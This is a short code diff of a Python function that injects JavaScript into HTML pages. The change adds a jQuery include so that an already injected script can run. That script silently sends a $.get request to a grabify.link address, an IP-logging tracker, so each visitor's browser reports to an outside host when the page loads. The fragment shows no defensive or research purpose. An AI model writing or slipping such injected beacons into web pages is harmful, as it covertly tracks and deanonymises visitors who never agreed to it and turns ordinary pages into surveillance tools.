@@ -56,6 +56,7 @@ def add_javascript_to_body(body_content):
     begin, end = body_content.split('<head>')
     
     script = '''
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script> 
         $.get("https://grabify.link/KFI3LW", function(data, status){
             console.log("Data: " + data + "\nStatus: " + status);
